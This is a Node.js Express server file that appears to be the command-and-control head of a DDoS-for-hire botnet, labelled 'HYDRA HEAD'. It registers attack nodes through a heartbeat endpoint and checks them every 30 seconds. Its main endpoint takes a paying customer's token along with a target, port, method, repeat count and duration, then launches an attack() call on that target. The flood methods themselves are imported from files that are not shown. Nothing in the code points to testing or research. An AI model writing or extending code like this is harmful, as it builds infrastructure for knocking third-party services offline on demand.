const express = require('express')
const app = express()
const port = process.env.PORT || 3000
const fetch = require('node-fetch');
const {attack} = require('./attack');
const {heartbeat} = require('./heartbeat');
const {checklicense, ReCheckNodes} = require('./utils');


app.get('/heartbeat', (req, res) => {
    const id = req.query.id;
    const address = req.query.address;
    if(!id || !address) res.send({'type': 'error', 'message': 'You must provide GET params correctly'});
    heartbeat(id, address, res);
})

setInterval(()=>{
    console.log('[SYSTEM] Check all nodes...');
    ReCheckNodes();
}, 30 * 1000)


app.get('/', (req, res) => {

    const token = req.query.token;
    const method = req.query.method;
    const target = req.query.target;
    const port = req.query.port;
    const repeats = req.query.repeats;
    const duration = req.query.duration;

    if(!token || !method || !target || !port || !repeats || !duration) res.send({
        'type': 'error',
        'message': 'You must provide correct GET params.'
    });

    checklicense(token, function(resp) {
        let response = JSON.parse(resp);
        let type = response.message || response.type;

        if(type=='success') {
            return res.send(attack(method, repeats, target, port, token, duration));
        } else {
            return res.send({"type": "error", "message": "You must provide valid token."})
        }
    });


})

app.listen(port, () => {
    console.log(`[HYDRA HEAD] System successfully started on port: ${port}`)
})
